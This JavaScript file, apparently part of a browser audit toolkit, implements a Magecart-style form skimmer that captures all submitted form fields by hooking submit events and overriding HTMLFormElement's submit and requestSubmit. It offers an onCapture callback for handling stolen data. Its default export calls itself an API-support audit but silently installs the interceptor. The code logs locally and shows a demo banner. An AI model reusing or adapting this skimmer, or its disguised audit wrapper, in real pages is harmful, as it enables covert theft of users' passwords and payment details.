/**
 * formjack.js — Magecart‑style Form Interception (Live Demo, Sandboxed)
 *
 * Real attack: intercepts all (or targeted) form submissions, captures the
 * entered data, and logs it locally to the console. A red banner warns the
 * user that their data was intercepted. The original form submission
 * proceeds normally so the demo is non‑destructive.
 *
 * Default export: Pinpoint `Form_Interface_Audit` (API support check).
 */

// ---------------------------------------------------------------------------
// 1. Form Interception Engine (Local Only)
// ---------------------------------------------------------------------------

const DEFAULT_OPTIONS = {
    targetSelector: null,       // CSS selector – if set, only those forms are monitored
    onCapture: null,            // callback({ formData, formElement, submitter, originalEvent })
    allowSubmission: true,      // let the form submit after we capture the data
    includeFileNames: true,     // capture file names (count) if file inputs exist
    detailedCapture: true,     // also return per‑field details
    filter: null,               // (formElement) => boolean
    showBanner: true,           // show a red banner when data is captured
    overrideRequestSubmit: false, // whether to wrap requestSubmit (advanced)
};

function extractFormData(form, submitter, options) {
    const formData = new FormData(form);
    const data = {};
    for (const [key, value] of formData.entries()) {
        if (data.hasOwnProperty(key)) {
            if (Array.isArray(data[key])) {
                data[key].push(value);
            } else {
                data[key] = [data[key], value];
            }
        } else {
            data[key] = value;
        }
    }

    if (submitter && submitter.name) {
        data[submitter.name] = submitter.value || '';
    }

    const detailed = [];
    if (options.detailedCapture) {
        const elements = form.elements;
        for (const el of elements) {
            const info = {
                name: el.name,
                type: el.type,
                tagName: el.tagName,
            };
            if (el.type === 'file' && el.files) {
                info.fileCount = el.files.length;
                if (options.includeFileNames) {
                    info.fileNames = Array.from(el.files).map(f => f.name);
                }
            } else if (el.type === 'checkbox' || el.type === 'radio') {
                info.checked = el.checked;
                info.value = el.value;
            } else {
                info.value = el.value;
            }
            detailed.push(info);
        }
    }

    return { formData: data, detailed };
}

/**
 * Intercepts form submissions, harvests the data, and displays it locally.
 *
 * @param {Object} [options] – see DEFAULT_OPTIONS
 * @returns {Function} cleanup function
 */
export function interceptFormSubmit(options = {}) {
    const config = { ...DEFAULT_OPTIONS, ...options };

    let stop = false;
    const originalRequestSubmit = HTMLFormElement.prototype.requestSubmit;
    const originalSubmit = HTMLFormElement.prototype.submit;

    function handleSubmit(event) {
        if (stop) {
            document.removeEventListener('submit', handleSubmit, true);
            return;
        }

        const form = event.target;
        if (!(form instanceof HTMLFormElement)) return;

        if (config.filter && typeof config.filter === 'function') {
            if (!config.filter(form)) return;
        }

        if (config.targetSelector && !form.matches(config.targetSelector)) return;

        const submitter = event.submitter || null;

        const captured = extractFormData(form, submitter, config);

        // ---- Log locally ----
        console.log('[formjack] Form submission intercepted!');
        console.log('  Form action:', form.action);
        console.log('  Data:', captured.formData);
        if (captured.detailed.length) {
            console.log('  Detailed:', captured.detailed);
        }

        // Show a red banner to alert the user visually
        if (config.showBanner) {
            const banner = document.createElement('div');
            banner.style.cssText =
                'position:fixed;top:0;left:0;width:100%;background:#d32f2f;color:white;text-align:center;' +
                'padding:8px;z-index:999999;font-family:sans-serif;font-size:14px;';
            banner.textContent = '[DEMO] Your form data was intercepted by formjack.js';
            document.body.prepend(banner);
            setTimeout(() => banner.remove(), 4000);
        }

        if (config.onCapture) {
            try {
                config.onCapture({
                    formData: captured.formData,
                    detailed: captured.detailed,
                    formElement: form,
                    submitter,
                    originalEvent: event,
                });
            } catch (_) { }
        }

        // Optionally block the real submission
        if (!config.allowSubmission) {
            event.preventDefault();
            event.stopImmediatePropagation();
        }
    }

    document.addEventListener('submit', handleSubmit, true);

    // Override requestSubmit if enabled
    if (config.overrideRequestSubmit && HTMLFormElement.prototype.requestSubmit) {
        HTMLFormElement.prototype.requestSubmit = function (submitter) {
            const form = this;
            const event = new SubmitEvent('submit', {
                submitter: submitter || null,
                bubbles: true,
                cancelable: true,
            });
            form.dispatchEvent(event);
            return originalRequestSubmit.call(form, submitter);
        };
    }

    HTMLFormElement.prototype.submit = function () {
        this.dispatchEvent(new Event('submit', { cancelable: false }));
        originalSubmit.call(this);
    };

    return function stopIntercepting() {
        stop = true;
        document.removeEventListener('submit', handleSubmit, true);
        if (config.overrideRequestSubmit) {
            HTMLFormElement.prototype.requestSubmit = originalRequestSubmit;
        }
        HTMLFormElement.prototype.submit = originalSubmit;
    };
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'formjack',
    title: 'Form_Interface_Audit',
    level: 5,
    info: 'Audits HTMLFormElement submit event prototype and submitter interface support.',
    steps: [
        'Check HTMLFormElement.prototype.requestSubmit support.',
        'Inspect form submission event handling capabilities.',
    ],
    run: async () => {
        // Trigger live demonstration
        interceptFormSubmit();

        const supported =
            typeof HTMLFormElement !== 'undefined' &&
            typeof HTMLFormElement.prototype.requestSubmit === 'function';
        return {
            requestSubmitSupported: supported,
            formElementSupported: typeof HTMLFormElement !== 'undefined',
        };
    },
};

export default pinpointModule;